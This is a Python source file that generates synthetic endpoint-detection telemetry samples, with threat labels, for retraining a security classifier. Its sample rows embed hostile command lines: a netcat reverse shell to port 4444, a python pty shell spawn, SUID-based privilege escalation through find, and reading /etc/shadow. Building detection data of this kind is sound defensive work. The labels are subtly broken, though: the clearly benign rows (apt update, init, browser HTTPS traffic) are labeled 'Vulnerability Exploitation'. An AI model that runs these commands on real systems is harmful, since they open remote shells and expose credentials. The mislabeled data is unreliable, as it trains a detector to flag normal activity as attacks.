"""Synthetic EDR text samples for Vigilon Triage (classifier) retraining."""

from typing import List, Tuple


def _rows(samples: List[str], label: str) -> List[Tuple[str, str]]:
    return [(text, label) for text in samples]


def get_edr_synthetic_training_samples() -> List[Tuple[str, str]]:
    rce = [
        "source=edr_telemetry family=process host=lab1 proc=nc pid=412 ppid=211 path=/usr/bin/nc cmdline=nc -e /bin/bash 10.0.0.5 4444 hint:nc_usage hint:reverse_shell_pattern hint:high_risk_port",
        "source=edr_telemetry family=process host=lab2 proc=python pid=900 ppid=455 path=/usr/bin/python3 cmdline=python3 -c 'import os,pty,socket; pty.spawn(\"/bin/sh\")' hint:reverse_shell_pattern",
        "source=edr_telemetry family=process host=lab3 proc=bash pid=1201 ppid=99 path=/tmp/run.sh cmdline=/bin/bash /tmp/run.sh hint:ephemeral_exec_path hint:download_exec_chain",
        "source=edr_telemetry family=network host=lab4 proc=sh pid=831 src=10.0.2.15:50120 dst=10.0.0.5:4444 proto=tcp hint:reverse_shell_pattern hint:high_risk_port",
    ]

    net = [
        "source=edr_telemetry family=network host=node1 proc=nmap pid=1002 src=10.0.1.10:53002 dst=10.0.1.1:22 proto=tcp hint:none",
        "source=edr_telemetry family=network host=node2 proc=python pid=444 src=10.0.1.15:54022 dst=185.220.101.5:9001 proto=tcp hint:high_risk_port",
        "source=edr_telemetry family=network host=node3 proc=curl pid=721 src=10.0.1.20:55211 dst=198.51.100.12:8080 proto=tcp hint:download_exec_chain",
        "source=edr_telemetry family=network host=node4 proc=nc pid=612 src=10.0.1.40:43000 dst=10.0.1.50:1337 proto=tcp hint:nc_usage hint:high_risk_port",
    ]

    priv = [
        "source=edr_telemetry family=process host=sec1 proc=sudo pid=221 ppid=200 path=/usr/bin/sudo cmdline=sudo -S /bin/bash user=www-data hint:none",
        "source=edr_telemetry family=process host=sec2 proc=pkexec pid=991 ppid=112 path=/usr/bin/pkexec cmdline=pkexec /bin/sh user=app hint:none",
        "source=edr_telemetry family=process host=sec3 proc=chmod pid=1771 ppid=220 path=/usr/bin/chmod cmdline=chmod u+s /usr/bin/find hint:none",
        "source=edr_telemetry family=process host=sec4 proc=find pid=1772 ppid=1771 path=/usr/bin/find cmdline=find / -exec /bin/sh -p \\; hint:none",
    ]

    leak = [
        "source=edr_telemetry family=process host=web1 proc=cat pid=901 ppid=211 path=/usr/bin/cat cmdline=cat /etc/shadow user=www-data hint:none",
        "source=edr_telemetry family=process host=web2 proc=grep pid=663 ppid=42 path=/usr/bin/grep cmdline=grep -R password /var/www hint:none",
        "source=edr_telemetry family=network host=web3 proc=scp pid=441 src=10.1.0.10:42000 dst=10.1.0.20:22 proto=tcp hint:none",
        "source=edr_telemetry family=process host=web4 proc=python pid=1741 ppid=66 path=/usr/bin/python3 cmdline=python3 -c 'print(open(\"db.sqlite\").read())' hint:none",
    ]

    benign = [
        "source=edr_telemetry family=process host=user1 proc=apt pid=300 ppid=1 path=/usr/bin/apt cmdline=apt update hint:none",
        "source=edr_telemetry family=process host=user2 proc=systemd pid=1 ppid=0 path=/usr/lib/systemd/systemd cmdline=/sbin/init hint:none",
        "source=edr_telemetry family=network host=user3 proc=chrome pid=2201 src=10.2.0.22:60312 dst=142.250.74.78:443 proto=tcp hint:none",
        "source=edr_telemetry family=network host=user4 proc=firefox pid=1432 src=10.2.0.30:60100 dst=151.101.1.69:443 proto=tcp hint:none",
    ]

    base = []
    base.extend(_rows(rce, "Remote Code Execution"))
    base.extend(_rows(net, "Network Attack"))
    base.extend(_rows(priv, "Privilege Escalation"))
    base.extend(_rows(leak, "Information Disclosure"))
    base.extend(_rows(benign, "Vulnerability Exploitation"))

    # deterministic expansion (no randomness)
    expanded: List[Tuple[str, str]] = []
    for i in range(1, 31):
        for text, label in base:
            expanded.append((f"{text} sample_id={i}", label))

    return expanded